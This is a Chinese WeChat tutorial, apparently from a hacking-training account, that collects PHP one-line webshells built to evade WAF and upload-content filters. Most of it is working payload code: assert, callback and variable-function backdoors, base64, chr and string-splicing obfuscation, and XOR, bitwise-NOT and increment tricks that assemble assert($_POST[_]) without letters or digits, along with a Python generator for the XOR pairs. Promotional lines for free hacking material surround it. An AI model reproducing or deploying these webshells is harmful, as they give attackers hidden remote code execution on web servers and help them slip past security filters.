<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/V7qlE0pxtvd-s52u_TMHFw)

**零基础学黑客，领取配套视频**

**#统统可白嫖#**

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSHyfzIicIMsib97kZfZEART3awLIBLCUTufSibfC1DXZotKfSvNs2Zr0MSUr7dEWIwsQiay1jwn5WXaOA/640?wx_fmt=png)

扫码找小助理白嫖黑客资料![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSEEQwsVFyfJD70E9HmDELbPwumVMkXxnmgmwHklA5JxIWJlzcPao47a9cibAmp1zeZ5Hf8yEWZSFBg/640?wx_fmt=png)

由学员 -xiao_yi 分享! 更多渗透技巧可领取视频！！！

**前言**  

由于文件上传的时候可能对文件内容进行检测

所以可能会对常见的 eval 函数进行过滤，而导致上传的一句话小马被阉割的情况

以下方法可能可以 Bypass WAF 或者是一些拦截检测

**函数简介**
--------

> assert

*   php < 7.3.4（查看文档原因和 eval 类似，php7.3 之后基本上 assert 被当成语言构造器，不再当作函数使用）
    

```
<?php @assert(@$_POST[123]);?>
# 只能执行单行命令
    1、执行 eval()
    2、执行写文件，把你需要的代码全部写入文件
    file_put_contents("web.php", '<?php echo 123; phpinfo();?>')
```

> create_function

```
<?php
$fun = create_function('', $_POST[123]);
$fun();
?>
# 第一个参数是传入匿名函数的参数， 第二个参数是执行的函数体
# 如果开发的代码仅仅是使用了匿名函数定义但未调用，可以尝试以下方式进行bypass
<?php
    $fun = create_function('',$_POST[123]);    
?>
# 本质上，create_function执行的代码如下:
#function 匿名($params1)
#{
#    $_POST[123];
#}
######################################################################
其原理和注入漏洞相似， 尝试闭合后构造成新的攻击语句执行
function 匿名($params1)
{
    $_POST[123];}phpinfo();//
}
```

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSEvOcL0F1Sg5V1Xv65CC7MLibP8jQ3p5Fz2CIj5tFj0GRpq5lVT1flYEZErs2amX6qWU0D82LxT80g/640?wx_fmt=png)

> preg_replace

该函数利用该正则表达式替换符合条件的字符串  
若在正则表达式末尾加上”e”， 那么这个函数的第二个参数就会被当作代码执行

**Warning: php_version > 5.6.9 正则不在支持 /e**

```
<?php
@preg_replace("/abcd/e", $_POST[123], "abcdefg");
?>
```

> file_put_contents

利用函数生成木马

```
<?php
$test = '<?php $a=$_POST[123]; assert($a);?>';
file_put_contents("web.php", $test);
?>
```

> array_map 回调函数

**有关回调函数的更多小 Tips 参照 p 神师傅的文章：**PHP 回调后门:http://33h.co/wn6vp

```
<?php
@array_map($_REQUEST[1], $_REQUEST[2]);
?>
#1=assert&2[]=phpinfo();
```

> call_user_func 回调函数

```
<?php
@call_user_func('assert', $_POST[123]);
?>
```

`call_user_func`函数可以调用其他函数， 第一个参数是被调用函数名，第二个参数是传入被调用函数里的参数

> call_user_func_array 回调函数

和上面的 `call_user_func`唯一区别的是传入的参数应该是数组

```
<?php
@call_user_func_array('assert', $_POST[123]);
?>
# POST : 123[]=phpinfo();
```

> array 数组变形 适用于 php <= 5.6.9

其实这里还是利用了可变变量的特性！

```
<?php
$item['JON']='assert';
$array[]=$item;
$array[0]['JON']($_POST[123]);
?>
```

> PHP 变量函数

```
<?php
$a = "eval";
$a($_POST[8]);
?>
```

> PHP 复杂变量导致的

```
<?php
$a = "${phpinfo()}";
?>
或
<?php
${phpinfo()}; # 注意：字符串的定义有问题，并不需要参数在双引号中
?>
```

> usort

```
bool usort(array &$array, callable $value_compare_func)
```

```
<?php
highlight_file(__FILE__);
usort(...$_GET);
#usort($_GET[1], "assert");
?>
# 传参为: ?1[]=phpinfo()&1[]=134&2=assert
# ?1[]=phpinfo()&1[]=123
//只有php版本 7.0.0-7.1.0(不包括7.1)有效
```

> uasort

```
<?php
highlight_file(__FILE__);
$e = "assert";
$arr = array(@$_REQUEST[pass], "test");
uasort($arr, $e);
?>
// 和上述一样 只有php版本 7.0.0-7.1.0(不包括7.1)有效
//php 7.1.9 可以使用system函数
```

**绕过 WAF**
----------

### PHP 可变变量

```
<?php
$bb = "eval";
$aa = "bb";
$$aa($_POST[123]);
?>
```

### str_replace

```
<?php
$a = str_replace("Cr4ck","", "asseCr4ckrt");
$a(@$_POST[123]);
?>
```

### preg_replace

```
<?php
$a = preg_replace("\Cr4ck\","", "asseCr4ckrt");
$a(@$_POST[123]);
?>
```

### base64_decode

```
<?php
$a=base64_decode("YXNzZXJ0")
$a($_POST[123]);
?>
# 常见命令执行函数base64编码如下
eval-------------------ZXZhbA==:复现的时候eval都无法成功，这是因为eval并不是一个函数，而是一个语言构造器，不能被可变函数调用
assert-----------------YXNzZXJ0
system-----------------c3lzdGVt
exec-------------------ZXhlYw==:注意使用exec的时候需要用echo函数将结果输出
```

> 解决 eval 不能被可变函数引用的方法

可以使用 eval 的包装函数，例如

```
<?php
$a = "my_e";
$b = "val";
function my_eval($params)
{
    eval($params);
}
$c = $a.$b;
$c('phpinfo();');
?>
```

### “.” 操作符

```
<?php
$a = 'a'.Chr(115).Chr(115).Chr(101);
$b = Chr(114).'t';
$c = $a.$b;
$c($_POST[123]);
?>
# 第二种用法
<?php
$a = 'a'.Chr(115).Chr(115).Chr(101);
$b = Chr(114).'t';
$c = $a.$b;
call_user_func($c, $_POST[123]);
?>
```

### parse_str

```
<?php
$str="a=assert";
parse_str($str);
$a($_POST[123]);
?>
```

**关于一些不包含数字和字母的 webshell**
--------------------------

参考自 p 神的文章和思路:http://33h.co/wn6v9

### demo

```
<?php
if(!preg_match('/[a-z0-9]/is', $_GET['shell']))
{
    eval($_GET['shell']);
}
?>
```

### 思路

将非字母、数字的字符经过各种变换， 构造出 a-z 中任意一个字符。然后再利用 PHP 允许动态函数执行的特点，拼接处一个函数名，如 “assert”，然后动态执行之即可。

注意：php5 和 php7 中 assert 函数定义差异，只有部分 php7 的版本可以使用动态函数执行 assert

### 方法

#### 利用异或生成字母

这里先记录一下 P 牛的 payload

```
<?php
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_='assert';
$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST';
$___=$$__;
$_($___[_]); // assert($_POST[_]);
```

这里写了一个简单的异或生成脚本

```
def main():
    str = r'~!@#$%^&*()_+<>?,.;:-[]{}\/`'
    needstr = "assert"
    dictin = {}
    left = {}
    right = {}
    for c in range(len(needstr)):
        for i in range (0, len(str)):
            for j in range(0, len(str)):
                a = ord(str[i])^ord(str[j])
                if needstr[c] == chr(a):
                    print(f"'{str[i]}'^'{str[j]}' =  {chr(a)}")
                    dictin[c] = chr(a)
if __name__ == '__main__':
    main()
```

挑选出一些无歧义字符， ‘+’在 url 中表示为空格，这里可能会产生一个比较坑的情况，需要特别注意一下

我构造的 payload 如下

```
$_='!]]_-/'^'@..:_[';$__='_'.('~`-~'^'./~*');$___=$$__;$____=$_($___[_]);
POST: _=phpinfo()
```

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSEvOcL0F1Sg5V1Xv65CC7MLj40DCqR67Nz1NXmbVHkOkAcaAobEQp1Q6ibqx90uE8wQt3PqOG8iaicmQ/640?wx_fmt=png)

#### 利用位运算的取反字符

这里利用的是 UTF-8 编码的某个汉字，并将其中某个字符取出来

取反得到一些字母 p 牛的 payload 如下

```
<?php
$__=('>'>'<')+('>'>'<');
$_=$__/$__;
$____='';
$___="瞰";$____.=~($___{$_});$___="和";$____.=~($___{$__});$___="和";$____.=~($___{$__});$___="的";$____.=~($___{$_});$___="半";$____.=~($___{$_});$___="始";$____.=~($___{$__});
$_____='_';$___="俯";$_____.=~($___{$__});$___="瞰";$_____.=~($___{$__});$___="次";$_____.=~($___{$_});$___="站";$_____.=~($___{$_});
$_=$$_____;
$____($_[$__]);
```

注意 + 号如果是 GET 传参需要先进行一次 url 编码成 %2b

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSEvOcL0F1Sg5V1Xv65CC7MLiaTuuGnfLpgfiaZ2EeycBYBThWTJ2NvgoW26nl2oU6X9Ef94q9NNFB0Q/640?wx_fmt=png)

#### 借助自增运算符拿到想要的字符

```
'a'++ => 'b'`、`'c'-- => 'c'
```

详情见文档:http://33h.co/wn6ye

payload 如下:

```
<?php
    $_=[];
    $_=@"$_";   //Array
    $_=$_['!'=='@'];
    $___=$_; // A
    $__=$_;
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;//S
    $___.=$__;
    $___.=$__;
    $__=$_;
    $__++;$__++;$__++;$__++; //E
    $___.=$__;
    $__=$_;
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; //R
    $___.=$__;
    $__=$_;
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;//T
    $___.=$__;
    $____='_';
    $__=$_;
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;//_P
    $____.=$__;
    $__=$_;
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;//O
    $____.=$__;
    $__=$_;
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;//S
    $____.=$__;
    $__=$_;
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;//T
    $____.=$__;
    $_=$$____;
    $___($_[_]);
    //ASSERT($_POST[_]);
    //合并成一行
    $_=[];$_=@"$_";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);
```

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSEvOcL0F1Sg5V1Xv65CC7MLyeEy7Sfwa8Tc9ErqxsYXK03RC040bY4yRpkDJUicGAQ4q79bePgxp5w/640?wx_fmt=png)

**参考来源**
--------

*   学院的 web 正式课
    
*   http://33h.co/wn6i2
    
*   http://33h.co/wn6i5
    

**总结**
------

Bypass 还是知识的对抗，通过不常见的回调函数加各种操作（比如编码，字符拼接， ascii 码的转换等），就可以构造出各种绕过 waf 的一句话木马！

@

**欢迎加我个人微信：zkaq99、**实时分享安全动态

* * *

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSE8r6UDibLl3oFOu6cEZPryVrS6n7TfhmDVMfKfIfc7nicyXQ0r0CjPZxPIACeen4QF4fuLwsRBhzMw/640?wx_fmt=jpeg)

[

超级牛批的 IP 地址查询工具

2021-06-25

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSGZPlHia3n9xfIeqNZlk2iaLpVMFV592QQBnFiaSkic2SHcxCMBib4mwYmk1RFiaHFddOCSly0js7gGlMrw/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247524023&idx=2&sn=f672c41128061e1577758d7ebd964a00&chksm=ebead79adc9d5e8c75e4a6af7b245b88077ede960ded86265fa14ac4e34611b3201d23be26b9&scene=21#wechat_redirect)

[

震惊！从一个 0day 到两个 0day 的奇妙之旅

2021-06-23

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSHSACQCfISQ9OhkCryXs7d79jtRdYFNiaaUtctlHKAAFcjGS4ibmPqlGZ1DtWn4GQUgl6PJSib1XVAyQ/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247523571&idx=1&sn=4db6247e86abe84872c4ce090a9922e5&chksm=ebead5dedc9d5cc8ee27e5a6111d044124e4802536e7cac695e8f5cd7452b21df86b2143daad&scene=21#wechat_redirect)

[

黑客技能｜教你用手机代替各类门禁卡

2021-06-22

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSFmbvACy4WbM26IkAkBJJiaDx2nbLYAllV0PKE2Bgg0WpzliajxpsPZlSSIg2utbwtrsn2dJfuEQibQA/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247523367&idx=1&sn=b21ac7a31c017da78f7d45665fbc865b&chksm=ebead50adc9d5c1c006423d15e05ab402d023321f6fae6aaabc5c6876ff053faf9e77bf2b935&scene=21#wechat_redirect)

[

实战 | 偶遇一赌博网站，渗透诛之!

2021-06-20

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSEarCPgSd5meGe4fejblEbjJs3sd19Oiaecgqh2UI9t8FaESt2vWbQbRAcffVRufMMLCibzXvZcaticg/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247523181&idx=1&sn=2cf5471f209baf9bad0a9cf2cdfb5b8f&chksm=ebead240dc9d5b562eb7e90acc1a900c010176abea6ba15ca747b066b60b55e937fc6f2cac53&scene=21#wechat_redirect)

[

一条 Fofa 搜索语法，实现批量挖洞

2021-06-15

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSGUIy41KKK40aUMdkCsia587omzM59hX1zMT0fupupLDznnkAN5BibQMe7liaNNwGc2okxeQ1XExlibfQ/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247522709&idx=1&sn=1470d7506167c835eaac4538a486c77f&chksm=ebead0b8dc9d59aeeac7b5d328146e8deab3fb1a25d650fb16d3575cba70e04a31079e7105ce&scene=21#wechat_redirect)

[

黑客技能｜断网攻击与监听演示

2021-06-04

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSE8YF0okRDl7zWnKCPoxDGUZeEaKAuibz1Wiaj3iaJJic8uoD1bVPIUv1hFKL5b1iauiclwiapBmAibEtjJEA/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247521713&idx=1&sn=ae4efd5b60465cf44be7b26e9abb5579&chksm=ebeadc9cdc9d558ad2b3dadf55a5571a0a5a52453248069186b2dc30101d9fc7b6cd5b88b343&scene=21#wechat_redirect)

[高段位隐藏 IP、提高溯源难度的几种实用方案！](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247520982&idx=1&sn=1a81ae558d471bbb84d89f3fe8b62039&chksm=ebeadbfbdc9d52ed27653fadc9c2b453028e31c8329dd0fc8034878b4124a94d4829d5f73f31&scene=21#wechat_redirect)

[2021-05-27](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247520982&idx=1&sn=1a81ae558d471bbb84d89f3fe8b62039&chksm=ebeadbfbdc9d52ed27653fadc9c2b453028e31c8329dd0fc8034878b4124a94d4829d5f73f31&scene=21#wechat_redirect)

**看到这里了，点个 “赞”、“再看” 再走吧！**